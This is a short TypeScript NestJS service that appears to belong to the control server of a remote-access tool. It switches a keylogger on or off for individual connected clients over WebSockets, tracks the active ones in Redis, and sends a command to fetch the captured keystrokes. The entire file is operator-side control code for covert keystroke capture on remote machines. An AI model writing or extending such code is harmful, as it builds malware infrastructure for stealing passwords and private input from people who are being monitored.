import { LoggerService } from "@/src/modules/shared/providers";
import { Injectable } from "@nestjs/common";
import { WsClientGateway } from "../../infrastructure/ws-client.gateway";
import { RedisRepository } from "@/src/repository/redis/domain/redis.repository";

@Injectable()
export class WsClientSendKeylogger {
  constructor(
    private readonly redisRepository: RedisRepository,
    private readonly logger: LoggerService,
    private readonly wsClientGateway: WsClientGateway,
  ) {}

  async sendKeyloggerEvent(clientid: string, status: boolean) {
    this.logger.info(`Sending command to client: ${clientid}`);

    if (status) {
      this.redisRepository.HSET(["keylogger"], { [clientid]: status });
    } else {
      this.redisRepository.HDEL(["keylogger"], clientid);
    }

    this.wsClientGateway.sendEventToClient(clientid, "keylogger", {
      status,
    });
  }

  async sendGetKeyloggerKeys(clientid: string) {
    await this.wsClientGateway.sendEventToClient(
      clientid,
      "keylogger:get-keys",
    );
  }
}
